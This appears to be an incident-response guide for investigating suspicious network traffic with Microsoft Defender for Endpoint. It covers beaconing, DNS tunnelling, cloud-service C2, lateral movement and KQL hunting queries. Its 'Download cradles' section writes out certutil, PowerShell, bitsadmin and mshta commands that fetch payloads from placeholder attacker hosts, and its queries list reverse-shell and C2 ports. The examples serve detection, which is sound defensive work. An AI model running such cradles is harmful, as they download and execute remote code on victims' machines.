# Suspicious network activity — investigation

## What you're looking for

Malware needs to phone home, download tools, reach other devices or send data out. All of that leaves network traces. The key question for every connection: is this process supposed to make this call, to this destination, in this way? Decide on the process and the destination. A pattern alone doesn't make traffic malicious, and a familiar destination doesn't make it benign.

What to do, in order, is in the [playbook](playbook.md). This page explains what you are looking at and how to scope it.

T0 = the first suspicious network event from the device, or the earliest malicious event before it, in UTC. It is not the alert time. Advanced Hunting holds 30 days of native data; older activity needs Sentinel retention.

---

## What MDE can and can't show you

| You want | In MDE? |
|----------|---------|
| Connection time, remote IP, port, URL or host name | Yes: `DeviceNetworkEvents` (`Timestamp`, `RemoteIP`, `RemotePort`, `RemoteUrl`, `RemoteIPType`) |
| Which process made the connection | Yes: `InitiatingProcessFileName`, `InitiatingProcessFolderPath`, `InitiatingProcessSHA1`, `InitiatingProcessCommandLine`, `InitiatingProcessId`, `InitiatingProcessCreationTime`, `InitiatingProcessParentFileName`, `InitiatingProcessAccountName`. `InitiatingProcessSHA256` is usually empty; use SHA1 |
| Whether that process is signed | Look up its SHA1 in `DeviceFileCertificateInfo` (`Signer`, `IsTrusted`). The `VersionInfo` columns are version metadata from the file itself; they don't show a signature |
| Whether the process ran in a remote desktop session | `IsInitiatingProcessRemoteSession` (RDP session or local) and `InitiatingProcessRemoteSessionIP` |
| Whether a connection was blocked | Not from `DeviceNetworkEvents`. Network protection blocks appear in `DeviceEvents` as `ExploitGuardNetworkProtectionBlocked` (audit only: `ExploitGuardNetworkProtectionAudited`) and in the alerts queue. Microsoft states a blocked site can still show `ConnectionSuccess` in network events, because those are reported from the TCP layer |
| Whether a connection is open now | Not from the logs. Use Live Response `connections` ("Shows all the active connections") or the investigation package's Network connections folder (`ActiveNetConnections.txt`) |
| Bytes sent or received | No. `DeviceNetworkEvents` has no byte-count column. Needs proxy or firewall logs |
| HTTP user agent | No column for it. Needs proxy logs |
| Full URL path of an HTTPS connection | Don't rely on it. For HTTPS, expect `RemoteUrl` to hold a host name at most (VERIFY (tenant)). The command line of the process often holds the full URL |
| DNS query names | No documented column. Microsoft describes a `DnsConnectionInspected` `ActionType` in `DeviceNetworkEvents` with the query in `AdditionalFields` (VERIFY (tenant)). The investigation package's `DnsCache.txt` shows the DNS resolver cache at collection time |

---

## C2 beaconing signals

Full detail, with the beaconing queries and their limits → [../08-c2-beaconing/investigation.md](../08-c2-beaconing/investigation.md). A timer-driven pattern shows that some software calls out on a schedule. It doesn't show that the software is malicious: decide that on the process and the destination.

| Signal | What it tells you | Limits |
|--------|-------------------|--------|
| Many connections to one destination | A short timer. A 60-second sleep gives about 1,440 connections a day | Browsers and SaaS apps also hit the same CDN or service IPs thousands of times. A slow beacon stays under any count threshold. C2 spread over several IPs splits the count |
| Regular gaps between connections | Timer-driven software | Defender and other agents, Teams, Windows Time, CRL/OCSP checks and RMM agents are timer-driven too. Regular doesn't mean malicious |
| Uniform byte sizes | A fixed heartbeat | Not in MDE; needs proxy or firewall logs |
| Connections at night | Nobody is driving the traffic | Weak. Servers and devices left on overnight make night traffic legitimately; a beacon on a laptop stops while the laptop sleeps |
| Unexpected initiating process | The strongest signal | Check the folder path, SHA1 and signer, not the name: a fake `svchost.exe` in `AppData` has the same file name as the real one. A beacon can also run inside a signed program (injection or DLL side-loading) |

**Cobalt Strike defaults:** sleep 60 seconds, jitter 0%, user agent "Internet Explorer (Random)" (see [Cobalt Strike defaults](../08-c2-beaconing/investigation.md#cobalt-strike-defaults)). Operators usually change them, MDE doesn't record user agents, and other C2 frameworks have their own defaults. A match is supporting evidence, not proof. Don't clear an alert because the values don't match.

---

## Download cradles

```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\update.exe
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
bitsadmin.exe /transfer job1 http://malicious.com/p.exe C:\Temp\p.exe
mshta.exe http://185.x.x.x/payload.hta
```

Suspicious destinations: raw IPs, paste sites, newly registered domains

---

## DNS beaconing

```
11:00:00  6d7367313a6f6b.c2.example.net
11:01:01  2f62696e2f7368.c2.example.net
```

Long, random-looking labels that change on every query under one parent domain = likely DNS tunnelling or C2. Tunnels usually encode data as hex or base32 rather than base64: DNS names are case-insensitive (RFC 1035: resolvers "must compare labels in a case-insensitive manner"), and base64 needs both cases. dnscat2, for example, states: "All data in both directions is transported in hex-encoded strings." Don't dismiss a label because it doesn't look like base64.

- **Count unique labels per parent domain** (`c2.example.net` above), not per full name. Every query in a tunnel has a different full name, so a count per name is always 1.
- **DNS beacons can be slow.** ATT&CK T1071.004: "DNS beacons may be difficult to detect because the beacons infrequently communicate with infected devices."
- **Where to see query names:** `DnsConnectionInspected` events, if your tenant has them (see the table above); the investigation package's `DnsCache.txt` (names the device resolved recently); and the customer's DNS server or resolver logs, if they keep them.
- **Don't rely on [dns-tunnelling.kql](../../../kql/network/dns-tunnelling.kql).** It groups by the full name, so its unique-label count is always 1, and it looks back 24 hours from when you run it, not from T0. Zero rows from it don't clear a device.
- **DNS over HTTPS.** ATT&CK T1572: "queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets." Those lookups never appear as DNS; you see only HTTPS connections to the resolver.
- A DNS tunnelling pattern is a playbook escalation trigger. The parent domain is the IOC.

---

## LOTS — Living Off Trusted Sites

Malware using legitimate cloud services for C2, payloads or exfiltration: OneDrive and SharePoint, Microsoft Graph, GitHub, Discord, Telegram, paste sites, Google Drive, Dropbox, object storage. Full detail → [../09-lots-cloud-c2/investigation.md](../09-lots-cloud-c2/investigation.md)

Classify the connecting process with the four client classes in [LOTS Step 1](../09-lots-cloud-c2/investigation.md#step-1--identify-the-client): A browser, B sync or collaboration client, C scripting engine or downloader, D anything else. Scripting engines are only one class. Class D covers unsigned programs, a known name in an unusual folder, a signed program that loaded a DLL from its own or a user-writable folder, and a non-Microsoft process calling Microsoft Graph. A trusted domain, a valid certificate and port 443 tell you nothing here.

---

## Lateral movement — network signals

| Pattern | Meaning |
|---------|---------|
| Many connections to internal IPs on port 445 | SMB scanning |
| Connections to port 3389 on multiple internal IPs | RDP lateral movement |
| Connections to port 5985/5986 | WinRM / PowerShell remoting |
| Connections to port 135/139 | WMI or legacy SMB |

---

## KQL queries

### All external connections from a device
```kql
// 03 — all external connections from one device
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive
// TODO: byte volumes need proxy/firewall logs; DeviceNetworkEvents has no SentBytes/ReceivedBytes

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteIPType != "Private"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort,
    InitiatingProcessFileName
| order by Timestamp asc
```

### High connection count
```kql
// C2 beaconing detection — high connection count to single external destination
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1071.001
// Primary beacon signal: same device hitting same external IP 30+ times per day
// Sort by ConnectionCount desc and investigate anything above 30 to a non-CDN destination
// Counts ConnectionSuccess rows in the 24h before T0 (24h keeps the 30-per-day threshold meaningful)
// TODO: byte volumes need proxy/firewall logs; DeviceNetworkEvents has no byte-count columns
// Ref: docs/scenarios/08-c2-beaconing/investigation.md, docs/scenarios/03-suspicious-network-activity/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where Timestamp between ((T0 - 24h) .. T0)
| where ActionType == "ConnectionSuccess"
| where RemoteIPType != "Private"
| where RemoteIP != ""
| summarize
    ConnectionCount = count(),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp),
    Processes = make_set(InitiatingProcessFileName, 3)
    by DeviceName, RemoteIP, RemoteUrl, RemotePort
| where ConnectionCount > 30
| extend DurationHrs = round(
    datetime_diff('minute', LastSeen, FirstSeen) / 60.0, 1)
| order by ConnectionCount desc
```

### Internal lateral movement scanning
```kql
// Internal lateral movement — network scanning detection
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1046
// Infected device probing internal IPs on admin/remote-access ports
// High TargetCount on any port = active scanning for spread opportunities
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive
// Remove the device filter to run estate-wide
// Ref: docs/scenarios/03-suspicious-network-activity/investigation.md, docs/scenarios/06-credential-compromise/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where RemoteIPType == "Private"
| where RemotePort in (445, 3389, 22, 135, 139, 5985, 5986)
| where Timestamp between ((T0 - 1h) .. (T0 + 1h))
| summarize
    TargetCount = dcount(RemoteIP),
    TargetIPs = make_set(RemoteIP, 10)
    by RemotePort, InitiatingProcessFileName
| order by TargetCount desc
```

### Unusual outbound ports
```kql
// Network — outbound connections on non-standard C2 ports
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1571
// Covers commonly used C2 and reverse shell ports not typical in business traffic
// Excludes known legitimate uses where possible — tune the process exclusion list
// for your environment
// Ref: docs/scenarios/03-suspicious-network-activity/investigation.md, docs/scenarios/08-c2-beaconing/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteIPType != "Private"
| where RemotePort in (
    4444,   // Metasploit default
    4445,   // Metasploit alternate
    1337,   // common C2 / reverse shell
    8080,   // alternate HTTP C2
    8443,   // alternate HTTPS C2
    8888,   // common C2
    9001,   // Tor / C2
    9090,   // common C2
    50050,  // Cobalt Strike team server default
    31337,  // classic backdoor port (Back Orifice)
    6666,   // IRC / C2
    6667,   // IRC C2
    1234,   // generic reverse shell
    2222,   // alternate SSH / C2
    5555,   // Android ADB / C2
    7777    // common C2
)
| where InitiatingProcessFileName !in~ (
    "chrome.exe", "msedge.exe", "firefox.exe",
    "teams.exe", "slack.exe", "zoom.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName,
    RemoteIP, RemotePort, RemoteUrl,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```
